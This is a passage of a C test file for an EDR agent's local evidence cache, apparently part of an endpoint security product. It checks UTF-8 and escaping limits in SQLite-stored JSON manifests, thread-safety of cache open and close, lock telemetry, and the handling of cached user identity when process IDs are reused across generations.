  snprintf(event.file_path, sizeof(event.file_path), "bad-\xC3\x28");
  event.dns_query[0] = '\0';
  event.reg_key_path[0] = '\0';
  event.reg_value_name[0] = '\0';
  edr_local_evidence_cache_record_behavior(&event);
  edr_local_evidence_cache_get_status(&after);
  assert(after.manifest_rejections == before.manifest_rejections + 1u);
  assert(after.records_dropped == before.records_dropped + 1u);
  assert(sqlite_post_artifact_count(db, candidate_id, "manifest-invalid-utf8") == 0u);
  sqlite_assert_all_artifact_manifests_parse(db);
  edr_local_evidence_cache_close();
  (void)remove(db);
  (void)remove("local_evidence_cache_manifest_contract.sqlite-wal");
  (void)remove("local_evidence_cache_manifest_contract.sqlite-shm");
}

static void fill_max_backslash_utf8(char *dst, size_t cap) {
  assert(dst != NULL && cap >= 5u);
  dst[0] = (char)0xe6;
  dst[1] = (char)0xb5;
  dst[2] = (char)0x8b; /* U+6D4B, valid three-byte UTF-8. */
  memset(dst + 3u, '\\', cap - 4u);
  dst[cap - 1u] = '\0';
}

static void fill_max_backslash_utf8_tagged(char *dst, size_t cap, unsigned tag) {
  int prefix;
  assert(dst != NULL && cap >= 32u);
  prefix = snprintf(dst, cap, "\xE6\xB5\x8B\\context-%02u\\", tag);
  assert(prefix > 0 && (size_t)prefix + 1u < cap);
  memset(dst + (size_t)prefix, '\\', cap - (size_t)prefix - 1u);
  dst[cap - 1u] = '\0';
}

/* The manifest envelope is sized for every selectable context slot, not only
 * one maximum event.  All 32 pre-context entries include maximum source text
 * with both heavy escaping and UTF-8, and the committed SQLite JSON remains
 * parseable and complete. */
static void test_context_manifest_32_maximum_ring_items_persist(void) {
  const char *db = "local_evidence_cache_manifest_32.sqlite";
  struct timespec ts;
  EdrBehaviorRecord pre, candidate;
  char bundle[131072];
  size_t source_fields_len = 0u;
  (void)remove(db);
  (void)remove("local_evidence_cache_manifest_32.sqlite-wal");
  (void)remove("local_evidence_cache_manifest_32.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(96150u, 0u, "parent-32.exe", "", "", "",
                        (uint64_t)(base - 2000000000LL), 0x96150u) == 0);
  init_record(&pre, EDR_EVENT_FILE_WRITE);
  pre.priority = 1u; pre.pid = 96151u; pre.ppid = 96150u;
  set_record_generation(&pre, 0x96151u);
  fill_max_backslash_utf8(pre.endpoint_id, sizeof(pre.endpoint_id));
  fill_max_backslash_utf8(pre.process_name, sizeof(pre.process_name));
  fill_max_backslash_utf8(pre.process_generation_source,
                          sizeof(pre.process_generation_source));
  fill_max_backslash_utf8(pre.net_dst, sizeof(pre.net_dst));
  fill_max_backslash_utf8(pre.file_path, sizeof(pre.file_path));
  snprintf(pre.source_completeness, sizeof(pre.source_completeness), "TRUNCATED");
  for (unsigned i = 0u; i < 32u; ++i) {
    const int written = snprintf(pre.source_truncated_fields + source_fields_len,
                                 sizeof(pre.source_truncated_fields) - source_fields_len,
                                 "%ssource.x%03u", source_fields_len ? "," : "", i);
    assert(written > 0 &&
           (size_t)written < sizeof(pre.source_truncated_fields) - source_fields_len);
    source_fields_len += (size_t)written;
  }
  assert(source_fields_len == sizeof(pre.source_truncated_fields) - 1u);
  for (unsigned i = 0u; i < 32u; ++i) {
    pre.event_time_ns = base - (int64_t)(32u - i) * 1000000LL;
    snprintf(pre.event_id, sizeof(pre.event_id), "manifest-32-pre-%u", i);
    /* Vary the parent-prefix key so ordinary-event aggregation cannot hide
     * 31 input slots before the context-ring contract is exercised. */
    fill_max_backslash_utf8_tagged(pre.file_path, sizeof(pre.file_path), i);
    edr_local_evidence_cache_record_behavior(&pre);
  }
  candidate = pre;
  candidate.type = EDR_EVENT_NET_CONNECT;
  candidate.priority = 3u;
  candidate.event_time_ns = base;
  snprintf(candidate.event_id, sizeof(candidate.event_id), "manifest-32-candidate");
  snprintf(candidate.net_dst, sizeof(candidate.net_dst), "10.96.15.1");
  candidate.net_dport = 445u;
  fill_max_backslash_utf8(candidate.file_path, sizeof(candidate.file_path));
  edr_local_evidence_cache_record_behavior(&candidate);
  sqlite_bundle_manifest_for_source_event(db, "manifest-32-candidate", bundle, sizeof(bundle));
  assert(strlen(bundle) > 40000u);
  {
    cJSON *root = cJSON_Parse(bundle);
    cJSON *context;
    assert(root != NULL);
    context = cJSON_GetObjectItemCaseSensitive(root, "context");
    assert(cJSON_IsArray(context) && cJSON_GetArraySize(context) == 32);
    for (int i = 0; i < cJSON_GetArraySize(context); ++i) {
      cJSON *item = cJSON_GetArrayItem(context, i);
      cJSON *path = cJSON_GetObjectItemCaseSensitive(item, "file_path");
      cJSON *source_completeness = cJSON_GetObjectItemCaseSensitive(
          item, "source_completeness");
      cJSON *source_fields = cJSON_GetObjectItemCaseSensitive(
          item, "source_truncated_fields");
      assert(cJSON_IsString(path) && path->valuestring);
      assert(strstr(path->valuestring, "\xE6\xB5\x8B") != NULL);
      assert(strchr(path->valuestring, '\\') != NULL);
      assert(cJSON_IsString(source_completeness) && source_completeness->valuestring &&
             strcmp(source_completeness->valuestring, "TRUNCATED") == 0);
      assert(cJSON_IsString(source_fields) && source_fields->valuestring &&
             strcmp(source_fields->valuestring, pre.source_truncated_fields) == 0);
    }
    cJSON_Delete(root);
  }
  sqlite_assert_all_artifact_manifests_parse(db);
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  (void)remove(db);
  (void)remove("local_evidence_cache_manifest_32.sqlite-wal");
  (void)remove("local_evidence_cache_manifest_32.sqlite-shm");
}

#if !defined(_WIN32)
typedef struct {
  const char *path;
} EvidenceCacheConcurrencyContext;

static void *evidence_cache_concurrent_writer(void *opaque) {
  EvidenceCacheConcurrencyContext *ctx = (EvidenceCacheConcurrencyContext *)opaque;
  (void)ctx;
  for (unsigned i = 0u; i < 80u; ++i) {
    EdrBehaviorRecord r;
    init_record(&r, EDR_EVENT_NET_CONNECT);
    r.priority = 3u;
    r.pid = 88000u + (i % 4u);
    r.event_time_ns = 1779340000000000000LL + (int64_t)i * 1000000LL;
    r.process_start_key = 0x88000u + (uint64_t)i;
    r.process_creation_filetime_100ns = 133700000000088000ULL + (uint64_t)i;
    snprintf(r.event_id, sizeof(r.event_id), "concurrent-event-%u", i);
    snprintf(r.endpoint_id, sizeof(r.endpoint_id), "ep-concurrent");
    snprintf(r.process_name, sizeof(r.process_name), "concurrent.exe");
    snprintf(r.image_path_canonical, sizeof(r.image_path_canonical), "C:\\Temp\\concurrent.exe");
    snprintf(r.cmdline, sizeof(r.cmdline), "concurrent.exe --%u", i);
    snprintf(r.file_path, sizeof(r.file_path), "C:\\Temp\\concurrent-%u.bin", i);
    snprintf(r.exe_hash, sizeof(r.exe_hash),
             "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    snprintf(r.net_dst, sizeof(r.net_dst), "10.20.0.%u", i % 200u + 1u);
    r.net_dport = 445u;
    snprintf(r.detection_context, sizeof(r.detection_context),
             "{\"rule_id\":\"R-CONCURRENT\",\"sequence\":%u}", i);
    edr_local_evidence_cache_observe_process(&r);
    edr_local_evidence_cache_enrich_behavior(&r);
    edr_local_evidence_cache_record_behavior(&r);
    edr_local_evidence_cache_poll_maintenance();
  }
  return NULL;
}

static void *evidence_cache_concurrent_reader(void *opaque) {
  EvidenceCacheConcurrencyContext *ctx = (EvidenceCacheConcurrencyContext *)opaque;
  (void)ctx;
  for (unsigned i = 0u; i < 80u; ++i) {
    char status[8192], query[8192], rows[4096], tree[4096];
    uint32_t returned = 0u, scanned = 0u;
    int truncated = 0;
    edr_local_evidence_cache_status_json(status, sizeof(status));
    assert(status[0] != '\0');
    assert(edr_local_evidence_cache_query_json("{\"limit\":10,\"time_window_s\":600}",
                                               query, sizeof(query)) == 0);
    assert(edr_local_evidence_cache_query_file_hash_json(
               "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
               "", ".bin", 10u, rows, sizeof(rows), &returned, &scanned, &truncated) == 0);
    (void)edr_local_evidence_cache_process_tree_json(88000u, "ep-concurrent", tree,
                                                      sizeof(tree));
  }
  return NULL;
}

static void *evidence_cache_concurrent_lifecycle(void *opaque) {
  EvidenceCacheConcurrencyContext *ctx = (EvidenceCacheConcurrencyContext *)opaque;
  for (unsigned i = 0u; i < 20u; ++i) {
    edr_local_evidence_cache_close();
    assert(edr_local_evidence_cache_open(ctx->path, 8u, 24u) == 0);
  }
  return NULL;
}

/* Preprocess writers, main-thread health/RTQ readers, and close/reopen must
 * serialize one bounded cache state and one SQLite handle. This is a real
 * lifecycle race test, not an external SQLite connection test. */
static void test_concurrent_cache_lifecycle_snapshot_and_queries(void) {
  const char *db = "local_evidence_cache_concurrent.sqlite";
  EvidenceCacheConcurrencyContext ctx = {db};
  pthread_t writer, reader, lifecycle;
  (void)remove(db);
  (void)remove("local_evidence_cache_concurrent.sqlite-wal");
  (void)remove("local_evidence_cache_concurrent.sqlite-shm");
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  edr_pt_cache_init();
  assert(pthread_create(&writer, NULL, evidence_cache_concurrent_writer, &ctx) == 0);
  assert(pthread_create(&reader, NULL, evidence_cache_concurrent_reader, &ctx) == 0);
  assert(pthread_create(&lifecycle, NULL, evidence_cache_concurrent_lifecycle, &ctx) == 0);
  assert(pthread_join(writer, NULL) == 0);
  assert(pthread_join(reader, NULL) == 0);
  assert(pthread_join(lifecycle, NULL) == 0);
  assert(edr_local_evidence_cache_open(db, 8u, 24u) == 0);
  edr_local_evidence_cache_close();
  edr_pt_cache_shutdown();
  (void)remove(db);
  (void)remove("local_evidence_cache_concurrent.sqlite-wal");
  (void)remove("local_evidence_cache_concurrent.sqlite-shm");
}

typedef struct {
  pthread_mutex_t mutex;
  pthread_cond_t cond;
  unsigned ready;
  int go;
} EvidenceCacheMutexTimingContext;

static void *evidence_cache_mutex_timing_worker(void *opaque) {
  EvidenceCacheMutexTimingContext *ctx = (EvidenceCacheMutexTimingContext *)opaque;
  pthread_mutex_lock(&ctx->mutex);
  ctx->ready++;
  pthread_cond_broadcast(&ctx->cond);
  while (!ctx->go) pthread_cond_wait(&ctx->cond, &ctx->mutex);
  pthread_mutex_unlock(&ctx->mutex);
  for (unsigned i = 0u; i < 8u; ++i) {
    edr_local_evidence_cache_test_hold_mutex(1u);
  }
  return NULL;
}

/* Fixed log2 telemetry must distinguish a genuine zero-sample startup from
 * saturated high values, and concurrent writers must accumulate without a
 * second lock or a racy health read. */
static void test_mutex_lock_observability_contract(void) {
  EdrEvidenceCacheStatus st;
  char fragment[8192];
  char document[8300];
  cJSON *root;
  cJSON *cache;
  cJSON *lock;
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);

  edr_local_evidence_cache_test_reset_mutex_timing();
  edr_local_evidence_cache_status_json(fragment, sizeof(fragment));
  assert(snprintf(document, sizeof(document), "{%s}", fragment) > 0);
  root = cJSON_Parse(document);
  assert(root != NULL);
  cache = cJSON_GetObjectItemCaseSensitive(root, "evidence_cache");
  lock = cJSON_GetObjectItemCaseSensitive(cache, "lock_observability");
  assert(cJSON_IsObject(lock));
  assert(cJSON_GetObjectItemCaseSensitive(lock, "samples")->valuedouble == 0.0);
  assert(cJSON_GetObjectItemCaseSensitive(lock, "wait_p95_ns")->valuedouble == 0.0);
  assert(cJSON_GetObjectItemCaseSensitive(lock, "hold_p99_ns")->valuedouble == 0.0);
  cJSON_Delete(root);

  edr_local_evidence_cache_test_reset_mutex_timing();
  edr_local_evidence_cache_test_record_mutex_timing(UINT64_MAX, UINT64_MAX);
  edr_local_evidence_cache_get_status(&st);
  assert(st.mutex_lock_samples == 1u);
  assert(st.mutex_wait_total_ns == UINT64_MAX && st.mutex_hold_total_ns == UINT64_MAX);
  assert(st.mutex_wait_max_ns == UINT64_MAX && st.mutex_hold_max_ns == UINT64_MAX);
  assert(st.mutex_wait_p95_ns == UINT64_MAX && st.mutex_wait_p99_ns == UINT64_MAX);
  assert(st.mutex_hold_p95_ns == UINT64_MAX && st.mutex_hold_p99_ns == UINT64_MAX);
  edr_local_evidence_cache_status_json(fragment, sizeof(fragment));
  assert(strstr(fragment, "\"lock_observability\"") != NULL);
  assert(strstr(fragment, "\"wait_max_ns\":18446744073709551615") != NULL);

  edr_local_evidence_cache_test_reset_mutex_timing();
  EvidenceCacheMutexTimingContext ctx = {
      PTHREAD_MUTEX_INITIALIZER, PTHREAD_COND_INITIALIZER, 0u, 0};
  pthread_t workers[4];
  for (size_t i = 0u; i < sizeof(workers) / sizeof(workers[0]); ++i) {
    assert(pthread_create(&workers[i], NULL, evidence_cache_mutex_timing_worker, &ctx) == 0);
  }
  pthread_mutex_lock(&ctx.mutex);
  while (ctx.ready < sizeof(workers) / sizeof(workers[0])) {
    pthread_cond_wait(&ctx.cond, &ctx.mutex);
  }
  ctx.go = 1;
  pthread_cond_broadcast(&ctx.cond);
  pthread_mutex_unlock(&ctx.mutex);
  for (size_t i = 0u; i < sizeof(workers) / sizeof(workers[0]); ++i) {
    assert(pthread_join(workers[i], NULL) == 0);
  }
  assert(pthread_cond_destroy(&ctx.cond) == 0);
  assert(pthread_mutex_destroy(&ctx.mutex) == 0);
  edr_local_evidence_cache_get_status(&st);
  assert(st.mutex_lock_samples == 32u);
  assert(st.mutex_hold_total_ns > 0u && st.mutex_hold_max_ns > 0u);
  assert(st.mutex_wait_total_ns > 0u && st.mutex_wait_max_ns > 0u);
  edr_local_evidence_cache_close();
}
#endif
#endif

static void test_identity_generation_match_delta(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts;
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t now = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(92001u, 1u, "x.exe", "x", "x", "p", now - 1000u,
                        0x92001u) == 0);
  EdrBehaviorRecord observed;
  init_record(&observed, EDR_EVENT_PROCESS_CREATE);
  observed.pid = 92001u; observed.event_time_ns = (int64_t)now;
  snprintf(observed.username, sizeof(observed.username), "ACME\\alice");
  snprintf(observed.identity_quality, sizeof(observed.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&observed);
  EdrBehaviorRecord hit;
  init_record(&hit, EDR_EVENT_NET_CONNECT);
  hit.pid = 92001u; hit.event_time_ns = (int64_t)now;
  edr_local_evidence_cache_enrich_behavior(&hit);
  EdrEvidenceCacheStatus st;
  edr_local_evidence_cache_get_status(&st);
  assert(strcmp(hit.username, "ACME\\alice") == 0);
  assert(strcmp(hit.identity_source, "cache") == 0 && strcmp(hit.identity_quality, "target_4688") == 0);
  assert(st.identity_cache_hits == 1u && st.identity_cache_misses == 0u);
  edr_pt_cache_shutdown();
  edr_local_evidence_cache_close();
}

static void test_sid_only_identity_enriches_same_generation(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t now = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(92501u, 1u, "sid.exe", "sid", "sid", "p", now - 1000u,
                        0x92501u) == 0);
  EdrBehaviorRecord observed; init_record(&observed, EDR_EVENT_PROCESS_CREATE);
  observed.pid = 92501u; observed.event_time_ns = (int64_t)now;
  snprintf(observed.user_sid, sizeof(observed.user_sid), "S-1-5-18");
  snprintf(observed.identity_quality, sizeof(observed.identity_quality), "target_4688");
  snprintf(observed.identity_source, sizeof(observed.identity_source), "target_4688");
  edr_local_evidence_cache_observe_process(&observed);
  EdrBehaviorRecord hit; init_record(&hit, EDR_EVENT_FILE_WRITE); hit.pid = 92501u; hit.event_time_ns = (int64_t)now;
  edr_local_evidence_cache_enrich_behavior(&hit);
  assert(!hit.username[0] && strcmp(hit.user_sid, "S-1-5-18") == 0);
  assert(strcmp(hit.identity_quality, "target_4688") == 0 && strcmp(hit.identity_source, "cache") == 0);
  EdrEvidenceCacheStatus st; edr_local_evidence_cache_get_status(&st); assert(st.identity_cache_hits == 1u);
  edr_pt_cache_shutdown(); edr_local_evidence_cache_close();
}

static void test_unknown_generation_identity_never_survives_to_later_kernel_generation(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t now = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
  edr_pt_cache_init();
  EdrBehaviorRecord security; init_record(&security, EDR_EVENT_PROCESS_CREATE);
  security.pid = 92502u; security.event_time_ns = (int64_t)now;
  snprintf(security.user_sid, sizeof(security.user_sid), "S-1-5-21-unknown");
  snprintf(security.identity_quality, sizeof(security.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&security);
  assert(put_generation(92502u, 1u, "kernel.exe", "", "", "", now + 1000u,
                        0x92502u) == 0);
  EdrBehaviorRecord later; init_record(&later, EDR_EVENT_NET_CONNECT);
  later.pid = 92502u; later.event_time_ns = (int64_t)(now + 2000u);
  edr_local_evidence_cache_enrich_behavior(&later);
  EdrEvidenceCacheStatus st; edr_local_evidence_cache_get_status(&st);
  assert(!later.user_sid[0]);
  assert(st.generation_unknown_update_rejects == 1u && st.identity_cache_misses == 1u);
  edr_pt_cache_shutdown(); edr_local_evidence_cache_close();
}

static void test_security_4688_identity_none_is_not_lifecycle_authoritative(void) {
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t start = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec - 1000u;
  edr_pt_cache_init();
  assert(put_generation(92503u, 1u, "kernel.exe", "", "", "", start,
                        0x92503u) == 0);
  EdrBehaviorRecord security; init_record(&security, EDR_EVENT_PROCESS_CREATE);
  security.pid = 92503u; security.event_time_ns = (int64_t)(start + 10u); security.is_security_4688 = 1u;
  /* Target/Subject placeholders have already parsed to empty fields. */
  assert(!security.username[0] && !security.user_sid[0]);
  assert(!edr_process_create_is_lifecycle_authoritative(&security));
  ProcessTreeEntry before, after;
  assert(edr_pt_cache_snapshot_at(92503u, start + 10u, &before) == 0);
  assert(edr_pt_cache_snapshot_at(92503u, start + 10u, &after) == 0);
  assert(before.start_time_ns == after.start_time_ns);
  security.is_security_4688 = 0u;
  assert(edr_process_create_is_lifecycle_authoritative(&security));
  edr_pt_cache_shutdown();
}

static void test_known_generation_rejects_late_and_zero_time_identity_updates(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t start = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec - 1000000000ULL;
  edr_pt_cache_init(); assert(put_generation(94501u, 1u, "b.exe", "b", "b", "p", start,
                                              0x94501u) == 0);
  EdrBehaviorRecord b; init_record(&b, EDR_EVENT_PROCESS_CREATE); b.pid=94501u; b.event_time_ns=(int64_t)(start+1000u);
  snprintf(b.user_sid,sizeof(b.user_sid),"S-B"); snprintf(b.creator_sid,sizeof(b.creator_sid),"C-B"); snprintf(b.exe_path,sizeof(b.exe_path),"B-path"); snprintf(b.identity_quality,sizeof(b.identity_quality),"target_4688"); edr_local_evidence_cache_observe_process(&b);
  EdrEvidenceCacheStatus before; edr_local_evidence_cache_get_status(&before);
  EdrBehaviorRecord late=b; late.event_time_ns=(int64_t)(start-1000u); snprintf(late.user_sid,sizeof(late.user_sid),"S-A"); snprintf(late.creator_sid,sizeof(late.creator_sid),"C-A"); snprintf(late.exe_path,sizeof(late.exe_path),"A-path"); edr_local_evidence_cache_observe_process(&late);
  EdrEvidenceCacheStatus after; edr_local_evidence_cache_get_status(&after);
  /* A pre-lifecycle timestamp has no authoritative source tuple, so it is
   * withheld rather than treated as the cached process generation. */
  assert(after.generation_unknown_update_rejects ==
         before.generation_unknown_update_rejects + 1u);
  EdrBehaviorRecord hit; init_record(&hit, EDR_EVENT_NET_CONNECT); hit.pid=94501u; hit.event_time_ns=(int64_t)(start+2000u); edr_local_evidence_cache_enrich_behavior(&hit);
  assert(strcmp(hit.user_sid,"S-B")==0 && strcmp(hit.creator_sid,"C-B")==0 && strcmp(hit.exe_path,"B-path")==0);
  EdrBehaviorRecord zero=b; zero.event_time_ns=0; snprintf(zero.user_sid,sizeof(zero.user_sid),"S-zero"); edr_local_evidence_cache_observe_process(&zero);
  edr_local_evidence_cache_get_status(&after); assert(after.generation_unknown_update_rejects == before.generation_unknown_update_rejects + 2u);
  edr_pt_cache_shutdown(); edr_local_evidence_cache_close();
}

static void test_identity_generation_mismatch_and_quality_order(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t now = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(93001u, 1u, "a.exe", "a", "a", "p", now - 3000000000ULL,
                        0x93001u) == 0);
  EdrBehaviorRecord creator;
  init_record(&creator, EDR_EVENT_PROCESS_CREATE); creator.pid = 93001u; creator.event_time_ns = (int64_t)(now - 2000000000ULL);
  snprintf(creator.username, sizeof(creator.username), "ACME\\creator");
  snprintf(creator.user_sid, sizeof(creator.user_sid), "S-creator");
  snprintf(creator.identity_quality, sizeof(creator.identity_quality), "creator_fallback");
  edr_local_evidence_cache_observe_process(&creator);
  EdrBehaviorRecord target = creator;
  snprintf(target.username, sizeof(target.username), "ACME\\target");
  snprintf(target.user_sid, sizeof(target.user_sid), "S-target");
  snprintf(target.identity_quality, sizeof(target.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&target);
  EdrBehaviorRecord lower = creator;
  snprintf(lower.username, sizeof(lower.username), "ACME\\lower");
  snprintf(lower.identity_quality, sizeof(lower.identity_quality), "token_sid");
  edr_local_evidence_cache_observe_process(&lower);
  EdrBehaviorRecord same;
  init_record(&same, EDR_EVENT_NET_CONNECT); same.pid = 93001u; same.event_time_ns = (int64_t)(now - 500000000ULL);
  edr_local_evidence_cache_enrich_behavior(&same);
  assert(strcmp(same.username, "ACME\\target") == 0 && strcmp(same.user_sid, "S-target") == 0);
  assert(strcmp(same.identity_quality, "target_4688") == 0);
  assert(edr_pt_cache_mark_exit(93001u, now - 1000000000ULL) == 0);
  assert(put_generation(93001u, 2u, "b.exe", "b", "b", "p", now,
                        0x93002u) == 0);
  EdrBehaviorRecord reused;
  init_record(&reused, EDR_EVENT_NET_CONNECT); reused.pid = 93001u; reused.event_time_ns = (int64_t)(now + 1000u);
  edr_local_evidence_cache_enrich_behavior(&reused);
  EdrEvidenceCacheStatus st; edr_local_evidence_cache_get_status(&st);
  assert(!reused.username[0]);
  assert(st.identity_generation_mismatch_rejects == 1u && st.identity_cache_misses == 1u);
  /* Slot retains target evidence despite later lower-quality observation. */
  /* Only creator->target is a quality upgrade; later token must not add one. */
  assert(st.identity_upgrades == 1u);
  edr_pt_cache_shutdown(); edr_local_evidence_cache_close();
}

static void test_kernel_generation_a_to_b_resets_cached_identity_once(void) {
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  struct timespec ts; assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  uint64_t now = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
  const uint32_t pid = 93002u;
  edr_pt_cache_init();
  assert(put_generation(pid, 1u, "a.exe", "cmd-A", "A-path", "p",
                        now - 3000000000ULL, 0x93021u) == 0);
  EdrBehaviorRecord a; init_record(&a, EDR_EVENT_PROCESS_CREATE);
  a.pid = pid; a.event_time_ns = (int64_t)(now - 2000000000ULL);
  snprintf(a.username, sizeof(a.username), "A-user"); snprintf(a.user_sid, sizeof(a.user_sid), "S-A");
  snprintf(a.creator_sid, sizeof(a.creator_sid), "C-A"); snprintf(a.exe_path, sizeof(a.exe_path), "A-path");
  snprintf(a.cmdline, sizeof(a.cmdline), "cmd-A"); snprintf(a.identity_quality, sizeof(a.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&a);
  assert(edr_pt_cache_mark_exit(pid, now - 1000000000ULL) == 0);
  assert(put_generation(pid, 2u, "b.exe", "cmd-B", "B-path", "p", now,
                        0x93022u) == 0);
  EdrEvidenceCacheStatus before, after; edr_local_evidence_cache_get_status(&before);
  EdrBehaviorRecord b; init_record(&b, EDR_EVENT_PROCESS_CREATE);
  b.pid = pid; b.event_time_ns = (int64_t)(now + 1000u);
  snprintf(b.user_sid, sizeof(b.user_sid), "S-B"); snprintf(b.creator_sid, sizeof(b.creator_sid), "C-B");
  snprintf(b.exe_path, sizeof(b.exe_path), "B-path"); snprintf(b.cmdline, sizeof(b.cmdline), "cmd-B");
  snprintf(b.identity_quality, sizeof(b.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&b);
  EdrBehaviorRecord hit; init_record(&hit, EDR_EVENT_NET_CONNECT);
  hit.pid = pid; hit.event_time_ns = (int64_t)(now + 2000u);
  edr_local_evidence_cache_enrich_behavior(&hit);
  edr_local_evidence_cache_get_status(&after);
  assert(after.generation_resets == before.generation_resets + 1u);
  assert(after.process_slots_used == before.process_slots_used && after.process_cache_evictions == before.process_cache_evictions);
  assert(!hit.username[0] && strcmp(hit.user_sid, "S-B") == 0 && strcmp(hit.creator_sid, "C-B") == 0);
  assert(strcmp(hit.exe_path, "B-path") == 0 && strcmp(hit.cmdline, "cmd-B") == 0);
  assert(strstr(hit.user_sid, "S-A") == NULL && strstr(hit.creator_sid, "C-A") == NULL && strstr(hit.exe_path, "A-path") == NULL);
  edr_pt_cache_shutdown(); edr_local_evidence_cache_close();
}

/* A delayed A record must not borrow any B cache field after PID reuse.  The
 * before/after candidate check makes this an observable P0-classification
 * invariant, not merely a cosmetic enrichment assertion. */
static void test_delayed_generation_mismatch_withholds_all_process_enrichment(void) {
  const uint32_t pid = 96201u;
  const uint64_t generation_a = 0x96201u;
  const uint64_t generation_b = 0x96202u;
  struct timespec ts;
  assert(edr_local_evidence_cache_open(":memory:", 8u, 24u) == 0);
  assert(clock_gettime(CLOCK_REALTIME, &ts) == 0);
  int64_t base = (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
  edr_pt_cache_init();
  assert(put_generation(pid, 701u, "a.exe", "a", "C:\\A.exe", "parent-a",
                        (uint64_t)(base - 3000000000LL), generation_a) == 0);
  EdrBehaviorRecord a;
  init_record(&a, EDR_EVENT_PROCESS_CREATE);
  a.pid = pid; a.ppid = 701u; a.event_time_ns = base - 2000000000LL;
  set_record_generation(&a, generation_a);
  snprintf(a.endpoint_id, sizeof(a.endpoint_id), "ep-delayed-generation");
  snprintf(a.process_name, sizeof(a.process_name), "a.exe");
  snprintf(a.exe_path, sizeof(a.exe_path), "C:\\A.exe");
  snprintf(a.cmdline, sizeof(a.cmdline), "a.exe --old");
  snprintf(a.username, sizeof(a.username), "A-user");
  snprintf(a.user_sid, sizeof(a.user_sid), "S-A");
  snprintf(a.identity_quality, sizeof(a.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&a);
  assert(edr_pt_cache_mark_exit_generation(pid, generation_a,
                                            (uint64_t)(base - 1000000000LL)) == 0);
  assert(put_generation(pid, 702u, "b.exe", "powershell.exe -EncodedCommand B",
                        "C:\\B.exe", "parent-b", (uint64_t)base,
                        generation_b) == 0);
  EdrBehaviorRecord b;
  init_record(&b, EDR_EVENT_PROCESS_CREATE);
  b.pid = pid; b.ppid = 702u; b.event_time_ns = base + 1000000LL;
  set_record_generation(&b, generation_b);
  snprintf(b.endpoint_id, sizeof(b.endpoint_id), "ep-delayed-generation");
  snprintf(b.process_name, sizeof(b.process_name), "b.exe");
  snprintf(b.exe_path, sizeof(b.exe_path), "C:\\B.exe");
  snprintf(b.cmdline, sizeof(b.cmdline), "powershell.exe -EncodedCommand B");
  snprintf(b.parent_name, sizeof(b.parent_name), "parent-b");
  snprintf(b.parent_path, sizeof(b.parent_path), "C:\\Parent-B.exe");
  snprintf(b.username, sizeof(b.username), "B-user");
  snprintf(b.user_sid, sizeof(b.user_sid), "S-B");
  snprintf(b.identity_quality, sizeof(b.identity_quality), "target_4688");
  edr_local_evidence_cache_observe_process(&b);

  EdrBehaviorRecord delayed;
  init_record(&delayed, EDR_EVENT_NET_CONNECT);
  delayed.pid = pid; delayed.event_time_ns = base - 1500000000LL;
  set_record_generation(&delayed, generation_a);
  snprintf(delayed.endpoint_id, sizeof(delayed.endpoint_id), "ep-delayed-generation");
  snprintf(delayed.net_dst, sizeof(delayed.net_dst), "198.51.100.77");
  delayed.net_dport = 80u;
  assert(edr_local_evidence_cache_is_candidate(&delayed) == 0);
  edr_local_evidence_cache_enrich_behavior(&delayed);
  assert(delayed.ppid == 0u && !delayed.process_name[0] && !delayed.exe_path[0] &&
         !delayed.cmdline[0] && !delayed.parent_name[0] && !delayed.parent_path[0] &&
         !delayed.parent_cmdline[0] && !delayed.username[0] && !delayed.user_sid[0]);
  assert(edr_local_evidence_cache_is_candidate(&delayed) == 0);
  EdrEvidenceCacheStatus st;
  edr_local_evidence_cache_get_status(&st);
  assert(st.identity_generation_mismatch_rejects >= 1u);
  edr_pt_cache_shutdown();
  edr_local_evidence_cache_close();
}

/* A provisional unknown-generation slot can retain no metadata when its PID
 * first becomes bound.  Sparse B must be rebuilt only from B's own record. */
